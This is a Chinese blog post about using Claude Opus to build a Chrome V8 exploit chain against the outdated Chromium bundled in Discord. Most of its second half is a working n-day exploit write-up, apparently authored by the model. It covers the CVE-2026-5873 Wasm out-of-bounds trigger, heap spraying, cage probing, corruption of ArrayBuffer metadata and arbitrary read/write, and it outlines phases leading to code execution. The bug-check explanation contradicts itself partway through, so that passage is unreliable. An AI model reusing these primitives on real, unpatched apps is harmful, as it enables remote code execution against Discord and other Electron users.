#  从 V8 OOB 到 RCE：我让 Claude Opus 写了一条 Chrome 漏洞利用链  
s1r1us
                    s1r1us  不吃猹的瓜   2026-07-05 07:42  
  
> **TLDR：**  
 我把 Discord 捆绑的 Chrome（版本 138，比上游落后九个主版本）交给 Claude Opus，让它构建一条完整的 V8 exploit chain。我们使用的 V8 OOB 来自 Chrome 146，也就是 Anthropic 自家 Claude Desktop 正在运行的版本。一周来回迭代，23 亿 tokens，2,283 美元 API 成本，再加上我大约 20 小时帮它从死胡同里脱身。最终它弹出了计算器。  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bJmDO3bwicPV2WqSDNftk9ZzAbza4rUEdtRydp5Y95Xkib2N0qddZGnk8guOFTQZLCbKeiamKWAc7CknM6F4Ws0Ny9ztjXn8t9YGOC1gTQab74/640?wx_fmt=other&from=appmsg "")  
  
image.png  
  
Anthropic 发布 Mythos 和 Project Glasswing 的消息，把整个科技圈点燃了。一边，怀疑者说这又是一次狼来了式的时刻，是把算力限制包装成安全剧场，或者只是迄今为止最会制造恐慌的 AI 营销。另一边，已经有人开始讨论要不要把服务器做网络隔离。  
  
不管 Anthropic 到底在下什么棋，也不管那些纸上谈兵的专家怎么说，这件事背后确实有真实问题。我认为这种“剧场”对网络安全总体是正面的，它很响亮地提醒我们接下来会发生什么。但我不想和那些一夜之间在 Twitter 和 LinkedIn 上冒出来的、成千上万的新晋网络安全专家一样，只坐在那里空谈这个判断。  
  
所以，与其理论推演，我想展示的是：当你把一个前沿模型指向互联网上最复杂的软件之一，也就是 Chrome 的 V8 engine，并要求它写出一个可工作的 exploit 时，会发生什么。  
  
核心问题很简单：如果模型越来越擅长把 patch 转成 exploit，而修补速度依旧缓慢，那么所有运行过时代码的东西会怎样？  
  
Mythos 是否被过度炒作并不重要。曲线并没有变平。就算不是 Mythos，也会是下一个版本，或者再下一个版本。最终，任何有足够耐心和 API key 的脚本小子，都能在未修补软件上拿到 shell。这只是时间问题，不是会不会发生的问题。  
## 背景：Patch Gap 与 Chromium 生态  
  
2022 年，我们在 DEF CON USA 发布过一项研究，主题是利用 Electron apps 中的 patch gap，目标包括 Discord、Teams、Notion，基本上就是所有基于 Electron 构建的东西。核心想法很简单：Electron app 会捆绑自己的 Chromium，而且通常会比上游落后数周甚至数月。这段空窗意味着，V8 中那些已知且已经被修复的 CVE，在你机器上的每个 Electron app 里仍然大门敞开。作为那项研究的一部分，我们写出了直接针对 Electron app 的可工作 n-day exploits。这里有一篇博客文章，讲的是我们如何利用一个 V8 n-day 在 Discord 上拿到 RCE。  
  
从 2022 年到现在，情况没有任何改变。下面是我机器上当前正在运行的版本：  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">App</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">Chrome 版本</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">Sandbox 状态</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Notion</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">144.0.7559.236</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">已启用</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Cursor</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">142.0.7444.265</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">已启用</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Claude Desktop</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">146.0.7680.179</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">已启用</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Discord</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">138.0.7204.251</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">主窗口无 sandbox</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Slack</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">132.0.6834.159</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">已启用</span></section></td></tr></tbody></table>  
> 注：对于启用了 sandbox 的 app，要形成完整 chain 需要三个 bug：heap control、V8 cage bypass 和 sandbox escape。上面这些 app 都存在公开可见且尚未修补的 sandbox escape CVE。理论上，写出这些 exploit 是可行的，只是我已经没有耐心继续手把手带 Opus 走完了。**我大概有 60% 的把握：只要几千美元，再加上足够多的人工盯梢和纠偏，就能 pwn 掉 Claude Desktop。**  
  
  
我选择 Discord 作为目标。因为主窗口没有 sandbox，它只需要两个 bug 就能形成完整 chain。它现在还停在 Chrome 138，比当前版本落后九个主版本。你仍然需要一个 discord.com 上的 XSS 来投递 payload。至于这有多难，就留给读者自己思考了。  
## 实验：Claude Opus vs. V8  
  
这不是一次单独的 chat session。它跨越了一周里的多个 Claude sessions，子任务被拆到多个 threads 中，有用于验证输出的 scaffolding，LLDB 输出会回灌到上下文里，进度也会跨 session checkpoint。  
  
我全程没有碰 LLDB；我做的只是发消息。我没有教它怎么利用漏洞，也没有解释 V8 internals，或者带它走 exploitation techniques。我的工作纯粹是操作层面的：识别它什么时候卡进循环，杀掉那些明显走不下去的 sessions，然后把它推向更有希望的目标。**你可以把它想象成开车但不碰发动机，只不过这辆车会不断试图自己冲进沟里，而把它维持在路上非常累。**  
  
**Step 1：寻找可以写 exploit 的 n-day**  
  
导出 Chrome 138 到最新 147 之间的每一个 CVE。让 Opus 阅读 V8 git log patches，并根据是否容易形成 out-of-bounds heap primitive 来挑选 bug。  
  
大多数 tokens 都花在了这里。Claude 在 22 个 sessions 中尝试了 27 种失败的方法，最后才找到了一条可行 chain。许多看起来可利用的 bug，最后都变成了死胡同。  
  
有些 bug 超出了它的能力范围。我知道怎么利用 CVE-2025-12429，但 Claude 没想出来。CVE-2026-3910 是一个 in-the-wild exploit，我们两个都没搞定。浪费了足够多的 sessions 之后，我不再让它自己选，而是把它指向一个根据此前探索我知道可行的 CVE；但它自己并没有意识到这是更容易的那个：  
> CVE-2026-5873：V8 中的 out of bounds read and write。已在 Chrome 147.0.7727.55 修复。报告日期：2026-03-25。  
  
  
**Step 2：写出能在 heap 上拿到 OOB 的 exploit**  
  
CVE-2026-5873 是 Chrome 146 上的一个 V8 heap OOB，而 Chrome 146 是低于最新版 Chrome 的版本。这个 bug 没有公开 exploit。仅凭 patch 的 git log，Claude 在挣扎了一天之后，从零构建出了一个可工作的 OOB read/write primitive。  
  
有个有趣的小故事：我在自己实际使用的 Chrome 上测试 exploit 时，它成功了。结果发现我还没点更新按钮。这就是 time-to-patch 的现实版。  
  
**Step 3：Heap Cage Bypass**  
  
heap 上的 OOB 还不够，你需要逃出 V8 的 sandbox 才能获得 arbitrary read/write。这需要第二个 bug。我从 Chromium tracker 中挑了一个已披露的 sandbox bypass，然后让 Claude 把它和 heap OOB 串起来：  
> V8 Sandbox Bypass：通过 import dispatch table corruption 触发 WasmCPT handle UAF（b/446113730 的多个变体）  
  
  
四天之后，完整 chain 出来了：  
  
如果你想阅读完整技术细节，下面是 Claude 对这个 bug 的说明：  
## Chrome 138 完整 Exploit Chain：从 CVE-2026-5873 到 RCE  
## 目标  
- **Chrome for Testing**  
 138.0.7204.232，ARM64 macOS（Apple Silicon）  
  
- **V8**  
 13.8.x（Turboshaft pipeline）  
  
- **Exploit URL**  
：http://localhost:8888/exploit-chromium.html  
  
- **Exploit file**  
：/tmp/chrome-exploit/exploit-chromium.html  
  
- **Wasm builder**  
：/tmp/chrome-exploit/wasm-module-builder.js  
（从 V8 test harness 复制）  
  
## Chrome 启动命令  
```
/tmp/chrome-138/chrome-mac-arm64/Google\ Chrome\ for\ Testing.app/Contents/MacOS/Google\ Chrome\ for\ Testing \
  --user-data-dir=/tmp/chrome-138-profile2 \
  --no-sandbox

```  
## 漏洞：CVE-2026-5873 — Turboshaft WebAssembly OOB Read/Write  
### 根本原因  
  
这是 V8 Turboshaft compiler 针对 WebAssembly 的一个 bounds-check elimination bug。当一个 Wasm 函数接收 i64  
 参数，通过 i32.convert_i64  
 将其截断为 i32  
，再将结果左移（例如 shl 2  
），并把它用作 memory load/store index 时，Turboshaft 的优化 pipeline 会在从 Liftoff tier-up 之后错误地消除 bounds check。  
### 触发模式  
```
(func $read (param i64) (result i32)
  local.get 0
  i32.convert_i64      ;; truncates to lower 32 bits
  i32.const 2
  i32.shl              ;; index * 4
  i32.load align=4 offset=0
)

```  
  
在 Liftoff（baseline）下，bounds check 会被正确应用。在 Turboshaft 编译该函数之后（由足够多的执行触发），bounds check 被消除，从而允许相对于 Wasm linear memory base 的任意 OOB read 和 write。  
### 关键细节：i32.convert_i64 截断  
  
i32.convert_i64  
 指令会丢弃高 32 位。因此当调用 read(0x100000000n)  
 时，effective index 是 0  
（被截断后）。这意味着：  
- **没有 bug 时**  
：read(0x100000000n)  
 返回与 read(0n)  
 相同的结果（二者都访问 offset 0）  
  
- **有 bug 时**  
：read(0x100000000n)  
 也会访问 offset 0，但通常会在大 index 上 trap 的 bounds check 被消除，因此 read(0x10000n)  
（对应 0x40000 字节的 offset，超过 1 page = 64KB）会成功，而不是 trap  
  
bug 检测逻辑（checkBug  
）利用的是：在 Liftoff 下，read(0x100000000n)  
 会 trap（bounds check 在截断前看到完整的 64-bit 值）；但在有 bug 的 Turboshaft 下，它会静默读取 offset 0（截断之后，没有 bounds check）。  
## Exploit Chain 概览  
```
Phase 0: Spray ArrayBuffers          → Heap markers for probing
Phase 1: Build Wasm OOB module       → CVE-2026-5873 trigger
Phase 2: Natural tier-up warmup      → Activate bounds-check elimination bug
Phase 3: Probe for AB backing stores → Find AB data via OOB reads
Phase 4-5: Determine M, N            → Calibrate wasm_mem ↔ cage offset mapping
Phase 6: Find JSArrayBuffer object   → Locate the V8 object metadata in cage
         → Corrupt backing_store     → In-cage arbitrary R/W
         → God buffer setup          → Full sandbox-wide R/W
         → addrof primitive          → Leak compressed pointers of JS objects
Phase 10: WasmCPT UAF (b/452605803)  → Sandbox bypass → full virtual address R/W
Phase 11: SANDBOX_BASE + Isolate     → Derive V8 sandbox base, find Isolate
Phase 12: WCPT redirect → system()   → Arbitrary code execution

```  
## Phase 0：ArrayBuffer Spray  
```
const AB_COUNT = 64
const AB_SIZE = 0x10000 // 64 KB each
for (let i = 0; i < AB_COUNT; i++) {
  const ab = new ArrayBuffer(AB_SIZE)
  new Uint32Array(ab).fill(0xcccc0000 | i) // unique marker per AB
  ABS.push(ab)
}

```  
  
创建 64 个 ArrayBuffer，每个 64 KB，并填充 0xCCCC0000 | index  
。在通过 Wasm OOB primitive 进行探测时，这些值会作为可识别的 landmarks。backing stores 会分配在 V8 sandbox 的 pointer compression cage 中；Phase 3 要发现的，就是它们相对于 Wasm linear memory base 的位置。  
## Phase 1：构造 Wasm Module  
  
构建三个函数：  
1. **read(i64) → i32**  
：OOB read primitive。接收 64-bit index，截断为 i32，左移 2 位，然后从 Wasm memory load i32。  
  
1. **write(i64, i32)**  
：OOB write primitive。同样执行截断 + shift，然后 store i32。  
  
1. **warmup(i32) → i32**  
：一个反复从 offset 0 读取的 hot loop。用于通过 natural tier-up 触发 Turboshaft compilation。  
  
该 Wasm module 恰好只有 1 page（64 KB）memory。在 Liftoff 下，超过 64 KB 的访问会 trap。而在带 bug 的 Turboshaft tier-up 之后，它们不会 trap。  
## Phase 2：Natural Tier-Up  
```
for (let batch = 0; batch < 50 && !bugActive; batch++) {
  inst.exports.warmup(2000000)
  for (let i = 0; i < 1000000; i++) read(BigInt(i & 0x3fff))
  for (let i = 0; i < 1000000; i++) write(BigInt(i & 0x3fff), (i & 0xff) | 0)
  await new Promise((r) => setTimeout(r, 500))
  bugActive = checkBug()
}

```  
  
warmup loop 必须在不同 batch 之间通过 await setTimeout  
 把控制权交还给 event loop，这样：  
1. V8 的后台编译线程才能完成 Turboshaft compilation  
  
1. renderer thread 不会卡死（Chrome 会杀掉无响应的 renderer）  
  
通常，bug 会在 batch 1 激活（也就是第一次 yield 之后立刻激活），这意味着 Turboshaft 会在 500ms sleep 期间完成这些函数的编译。  
### Bug Detection  
```
function checkBug() {
  new Uint32Array(inst.exports.mem.buffer)[0] = 0xdeadbeef
  let v0 = read(0n) >>> 0
  try {
    let v1 = read(0x100000000n) >>> 0
    return v1 !== v0
  } catch (e) {
    return true
  }
}

```  
- 如果 read(0x100000000n)**抛异常**  
 → bounds check 仍然有效 → 仍处于 Liftoff → return true  
（实际上 bug 已经 active，因为 Liftoff 会基于完整 64-bit index trap；Turboshaft 会截断并且不会 trap……但是：这里的 catch 返回 true。仔细看，真实检测应该是，在带 bug 的 Turboshaft 下，调用会成功并返回与 read(0n)  
 相同的值（因为截断），所以 v1 !== v0  
 为 false  
。在 Liftoff 下，它会抛异常，所以 catch  
 返回 true  
。等等，这意味着 checkBug()  
 在两种情况下都会返回 true  
？）  
  
实际上，这里的逻辑更微妙。catch(e) { return true; }  
 路径会在 Liftoff 仍然 active 时命中（函数会在 large index 上 trap）。但这里的 return true  
 是有意的：它表示“bug 可能已经 active”，因为 throw 本身说明函数仍按 64-bit 级别做 bounds check（Liftoff 行为）。真正的证明是，在 Turboshaft 之后，read(0x100000000n)  
 返回 0xDEADBEEF  
（截断到 index 0），与 v0  
 匹配，因此 v1 !== v0  
 为 false  
。外层循环只会在 true  
 时中断，而 true  
 会在以下情况出现：  
- 函数抛异常（Liftoff 仍然 active，但我们也会在 Phase 3 尝试真正的 OOB）  
  
- v1 !== v0  
 为 true（意味着截断后的 index 读到了不同数据，也就是说 bounds checks 已被消除，64KB 之外的 memory 可访问）  
  
实践中，bug 会稳定地在第一个 batch 激活，后续 Phase 3 中的 OOB probes 会确认这一点。  
## Phase 3：探测 AB Backing Stores  
### V8 Sandbox Memory Layout  
```
cage_base (4 GB pointer compression cage)
├── [0x00000000 .. 0x0FFFFFFF]  cage region 0
├── [0x100000000 .. 0x1FFFFFFFF] cage region 1
├── ...
├── [N*4GB .. (N+1)*4GB-1]      AB backing stores land here
├── ...
├── [M*4GB]                      Wasm linear memory base
└── ... up to 1 TB sandbox

```  
  
Wasm linear memory 位于 cage offset M * 4GB  
。AB backing stores 位于 cage offset N * 4GB + sub_offset  
。OOB primitive 会相对于 Wasm memory base 读取，因此要到达 cage offset 为 X  
 的 AB backing store，需要计算：  
```
byte_offset = X - M * 4GB
param = byte_offset / 4          (because read shifts left by 2)
upper = param >> 32               (passed as high 32 bits of i64)
lower = param & 0xFFFFFFFF        (truncated to i32 by i32.convert_i64)

```  
  
exploit 会为 M ∈ [5,9] 和 N ∈ [0,6] 生成 probes：  
```
let delta = BigInt(n - m) * 0x100000000n + 0xa0000n
let param = delta / 4n

```  
  
0xa0000  
 这个 sub-offset 是 AB backing stores 在各自 4GB region 内开始位置的常见 alignment offset。  
### 为什么用 BigInt？  
  
JavaScript 的 >>  
 operator 只能作用于 32-bit integers。对于 delta  
 为负且很大的 probes（例如 (0 - 9) * 4GB  
），如果使用普通 JS numbers，会被静默截断为 32 bits。BigInt 可以保留完整的 64-bit 值。  
### 典型结果  
- **Chrome standalone**  
：M=5, N=1 或 M=6, N=0  
  
- **Electron**  
：M=7-9, N=1-3（更多 memory overhead）  
  
当 probe 返回 0xCCCC00XX  
 时，就说明我们找到了 AB[XX] 的 backing store。  
## Phase 4-5：确定 M 和 N  
  
根据 probe 结果，我们知道 N - M  
（差值），但还不知道 M 和 N 各自是多少。我们通过尝试候选值，并检查在已知小 offset（0x40000、0x80000）处的 cage reads 是否返回非零数据，来确定 M（heap objects 总是存在于较低 cage offsets）。  
```
function readCage32(cageOffset) {
    const bd = cageOffset - M * 4GB;
    const param = bd / 4;
    return rd(param_upper, param_lower);
}

```  
  
一旦 M 已知，readCage32  
 和 writeCage32  
 就可以把任意 cage offset 转换为正确的 OOB read/write 参数。  
## Phase 6：寻找 JSArrayBuffer Object  
  
这是最复杂的 phase。我们需要找到 JSArrayBuffer 的 **metadata object**  
（不只是它的 backing store data），这样才能 corrupt 它的 backing_store  
 和 byte_length  
 字段。  
### Step 1：计算 Backing Store 的 SandboxedPointer  
  
V8 会把 backing_store  
 字段保存为 **SandboxedPointer**  
，也就是 cage offset 左移 24 bits：  
```
const bsCageOff = BigInt(N) * fourGB + ab_sub // backing store cage offset
const bsSP = bsCageOff << 24n // SandboxedPointer encoding
const bsSPhi = Number((bsSP >> 32n) & 0xffffffffn)

```  
### Step 2：在 Cage Heap 中扫描 SP  
  
我们会在低 cage region（0x40000 到 0x2000000）中扫描 SandboxedPointer 的高 32 bits。命中后，再把完整 SP 解码回 cage offset，并读取 AB 的 marker data 进行验证：  
```
for (let off = 0x40000; off < 0x2000000; off += 4) {
  let v = readCage32(off)
  if (v !== bsSPhi) continue
  let lo = readCage32(off - 4)
  const spFull = (BigInt(v) << 32n) | BigInt(lo >>> 0)
  const candOff = spFull >> 24n
  let content = readCage32(candOff)
  if ((content & 0xffff0000) >>> 0 === 0xcccc0000) {
    // Found! The SP at (off-4, off) points to an AB backing store
  }
}

```  
### Step 3：通过 JS-side Marker Write 验证  
  
我们通过 cage R/W 向 backing store 写入一个唯一 marker，然后检查哪个 JS ArrayBuffer 能看到它：  
```
writeCage32(Number(origBackingOff), 0xbeef1234)
for (let i = 0; i < ABS.length; i++) {
  if (new DataView(ABS[i]).getUint32(0, true) === 0xbeef1234) {
    realVictimIdx = i
    break
  }
}

```  
### Step 4：寻找真正的 JSArrayBuffer Object  
  
多个结构都会引用 backing store，例如 BackingStore  
 metadata、ArrayBufferExtension  
。为了找到真正的 JSArrayBuffer  
，我们通过修改 byte_length  
 进行探测：  
```
for (let off = 0x40000; off < 0x2000000; off += 4) {
  // Find SP match
  if (readCage32(off) !== orig_bs_hi) continue
  if (readCage32(off - 4) !== orig_bs_lo) continue

  for (const bsOff of [0x24, 0x20]) {
    const abBase = off - 4 - bsOff
    let save = readCage32(abBase + 0x18)
    writeCage32(abBase + 0x18, 0x00004242) // corrupt byte_length hi
    if (victim.byteLength !== 0x10000) {
      // JS-visible byteLength changed → this IS the JSArrayBuffer!
      writeCage32(abBase + 0x18, save) // restore
      targetABOff = abBase
      break
    }
    writeCage32(abBase + 0x18, save)
  }
}

```  
### JSArrayBuffer Layout（V8 13.8，Sandbox Mode）  
```
+0x00: map (compressed pointer)
+0x04: properties_or_hash
+0x08: elements
+0x0C: ...
+0x10: flags / bit_field
+0x14: byte_length (low 32)
+0x18: byte_length (high 32)
+0x1C: max_byte_length (low 32)
+0x20: max_byte_length (high 32)
+0x24: backing_store SandboxedPointer (low 32)
+0x28: backing_store SandboxedPointer (high 32)
+0x2C: extension

```  
### Step 5：arbRead32 / arbWrite32  
  
在已经定位到位于 targetABOff  
 的 JSArrayBuffer object 后，我们可以临时重定向它的 backing_store  
，从而 read/write 任意 cage offset：  
```
function arbRead32(cageOffset) {
  const raw = BigInt(cageOffset) << 24n // encode as SandboxedPointer
  writeCage32(targetABOff + 0x24, Number(raw & 0xffffffffn))
  writeCage32(targetABOff + 0x28, Number((raw >> 32n) & 0xffffffffn))
  const val = victimView.getUint32(0, true)
  // restore original backing_store
  writeCage32(targetABOff + 0x24, orig_bs_lo)
  writeCage32(targetABOff + 0x28, orig_bs_hi)
  return val
}

```  
### Step 6：God Buffer  
  
将 backing_store  
 设置为 0（= cage base），并将 byte_length  
 设置为 0xFFFFFFFFFFFFFFFF  
：  
```
writeCage32(targetABOff + 0x24, 0) // backing_store → cage base
writeCage32(targetABOff + 0x28, 0)
writeCage32(targetABOff + 0x14, 0xffffffff) // byte_length = max
writeCage32(targetABOff + 0x18, 0xffffffff)
writeCage32(targetABOff + 0x1c, 0xffffffff) // max_byte_length = max
writeCage32(targetABOff + 0x20, 0xffffffff)

```  
  
现在 new DataView(victim)  
 可以 read/write 整个 V8 sandbox 中的任意 offset（通过 byteLength  
 最多可见 34 GB）。  
### Step 7：addrof Primitive  
  
